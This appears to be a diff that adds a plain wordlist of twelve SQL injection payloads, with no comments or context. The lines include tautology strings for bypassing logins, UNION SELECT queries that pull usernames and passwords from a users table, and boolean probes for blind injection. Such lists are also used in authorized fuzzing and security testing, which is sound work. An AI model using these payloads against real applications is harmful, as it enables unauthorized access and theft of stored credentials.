@@ -1,0 +1,12 @@
+' OR '1'='1' --
+' OR '1'='2' --
+' OR '1'='1' /* 
+' UNION SELECT NULL, username, password FROM users --
+' UNION SELECT username, password FROM users --
+' AND (SELECT COUNT(*) FROM users) > 0 --
+' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password='password') --
+' OR 'a'='a' --
+' AND 1=1 --
+' AND 1=2 --
+' UNION SELECT 1, 'test', 'test' -- 
+' UNION SELECT 1, 2, 3 -- 
